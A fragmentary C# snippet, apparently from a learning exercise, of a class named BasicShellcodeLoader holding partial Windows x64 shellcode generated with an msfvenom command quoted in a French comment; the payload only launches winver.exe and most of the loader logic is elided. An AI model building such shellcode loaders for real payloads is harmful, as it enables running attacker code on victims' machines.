...
namespace Loader
{
    public class BasicShellcodeLoader
    {
        ...
        public static void Main()
        {
            ...
            // msfvenom -p windows/x64/exec CMD="C:\windows\system32\winver.exe" -f csharp --> j'ai obtenu ce code via kali linux
            byte[] sc = new byte[298] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            ...
            0x65,0x6d,0x33,0x32,0x5c,0x77,0x69,0x6e,0x76,0x65,0x72,0x2e,
            0x65,0x78,0x65,0x00 };
